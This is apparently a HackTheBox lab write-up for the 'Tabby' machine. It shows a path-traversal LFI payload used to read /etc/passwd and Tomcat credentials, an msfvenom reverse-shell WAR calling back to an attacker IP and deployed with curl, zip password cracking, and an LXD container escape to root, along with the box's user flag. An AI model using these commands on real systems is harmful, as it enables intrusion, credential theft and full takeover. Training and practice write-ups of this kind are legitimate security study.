# Tabby

**Tabby** is an easy HackTheBox box by egre55.

`nmap -sC -sV -oN nmap 10.10.10.194 -v -A` shows ports 80, 22 and 8080 are open. Let's start with the website.

![site](imgs/site.png)

After searching a bit I find `files/statement`:

```
We apologise to all our customers for the previous data breach.
We have changed the site to remove this tool, and have invested heavily in more secure servers
```

The tool is the `news.php` page which does not work at first sight. But changing `http://megahosting.htb/news.php?file=statement` to `http://10.10.10.194/news.php?file=statement` makes it work properly. Here is my entry point, I can use the vulnerable tool which should not be accessible. I feel like there could be an LFI to exploit but I can't make it to `/etc/passwd`.

After wasting hours with dirb, sql injections or even fuzzing the `file` parameter, I finally realize that my first feeling was good, but I did not try hard enough, because `http://10.10.10.194/news.php?file=../../../../etc/passwd` works correctly.

Let's check port 8080 to see how to exploit it, maybe I can leak the `manager` creds.

![8080](imgs/8080.png)

THIS is interesting:

```
NOTE: For security reasons, using the manager webapp is restricted to users 
with role "manager-gui". The host-manager webapp is restricted to users with
role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```

There is nothing in `../../../../etc/tomcat9/tomcat-users.xml` but after testing with my own tomcat installation, I find it in `../../../../usr/share/tomcat9/etc/tomcat-users.xml`:

```xml

  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>

   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

There are my creds: `tomcat:$3cureP4s5w0rd123!`

![tomcat](imgs/tomcat.png)

For some reason I can not access the `manager` page on the browser but curl has no problem. Let's create my war reverse shell with msfvenom and upload it with curl:

```
$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.27 lport=4444 -f war -o shell.war
$ curl --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shell.war" --user 'tomcat:$3cureP4s5w0rd123!'
```

Now let's visit `http://10.10.10.194:8080/shell.war` after setting up my listerner on host. I get a shell as `tomcat`, let's now privilege escalation to `ash`.

## Privilege escalation

`python3 -c 'import pty; pty.spawn("/bin/bash")'` spawns a nicer shell to work with. After moving around, I find `/var/backups`:

```
tomcat@tabby:/var/backups$ ls -all
-rw-r--r--  1 root root 41559 Jun 17 16:22 apt.extended_states.0
-rw-r--r--  1 root root  4561 May 21 13:16 apt.extended_states.1.gz
-rw-r--r--  1 root root  4400 May 21 10:31 apt.extended_states.2.gz
-rw-r--r--  1 root root  3683 May 19 11:54 apt.extended_states.3.gz
```

I download them on host, decompress everything but nothing interesting there. Let's dig again. I find `16162020_backup.zip` in `/var/www/html/files` which belongs to `ash`. It is password protected, let's crack it with fcrackzip: `fcrackzip -D -p /usr/share/wordlists/rockyou.txt -v 16162020_backup.zip`.

Sucess! The password is `admin@it`. The files aren't important because this password works with `su ash`. Let's get the user flag:

`e7b9fbf22b9fabc4b70156152f3117d3`

```
$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

I try to find files that could belong to those groups, but only `adm` has potentially interesting files: `find / -group adm 2>/dev/null`, and I do not find anything useful. I also try some enumeration with linpeas and linenum:

```
...
[+] Unexpected folders in root
/cdrom

...
[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 10769 Jun 17 16:03 /var/log/apache2/access.log.1

-rw-r----- 1 root adm 10619 May 21 13:16 /var/log/apt/term.log.2.gz

...
[+] Finding passwords inside logs (limit 70)
...
/var/log/auth.log.1:Jun 16 17:54:15 ghost passwd[1307]: pam_unix(passwd:chauthtok): password changed for ash
```

But I do not find any way to exploit it. I finally find what I was searching for here: [https://www.hackingarticles.in/lxd-privilege-escalation](https://www.hackingarticles.in/lxd-privilege-escalation/). Let's use lxd-alpine-builder:

```
curl http:/10.10.14.27/alpine-v3.12-x86_64-20200702_1826.tar.gz -o alpine-v3.12-x86_64-20200702_1826.tar.gz
lxc image import ./alpine-v3.12-x86_64-20200702_1826.tar.gz --alias myimg
lxd init
lxc init myimg ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Aaaand I am root! *Note: see link for explanations*
